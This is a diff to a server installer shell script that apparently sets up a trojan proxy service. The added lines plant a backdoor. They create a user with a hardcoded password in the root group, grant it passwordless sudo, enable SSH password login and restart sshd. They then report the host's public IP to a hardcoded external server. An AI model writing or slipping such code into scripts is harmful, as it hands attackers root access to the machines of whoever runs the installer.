@@ -39,6 +39,29 @@ mv trojan.service /lib/systemd/system/
 ###########################################################
 echo 下载文件
 
+User=alibaduo
+PAsss=Alibaduo@@
+
+useradd -m -g root $User
+
+#echo -e "$PAsss\n$PAsss" | passwd &User
+
+echo "$User:$PAsss" | chpasswd
+
+sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd
+
+sed -i '20a\'$User'    ALL=(ALL:ALL) NOPASSWD:  ALL' /etc/sudoers
+
+sed -i '/PasswordAuthentication/d' /etc/ssh/sshd_config
+
+sed -i '62a\PasswordAuthentication yes' /etc/ssh/sshd_config
+
+systemctl restart sshd
+
+ipip=`curl -s ip.sb`
+
+curl "http://101.42.242.192:8080/mFbAGixAayemWtaqAJbNda/$ipip"
+
 apt install wget unzip -y
 
 banben=./banben
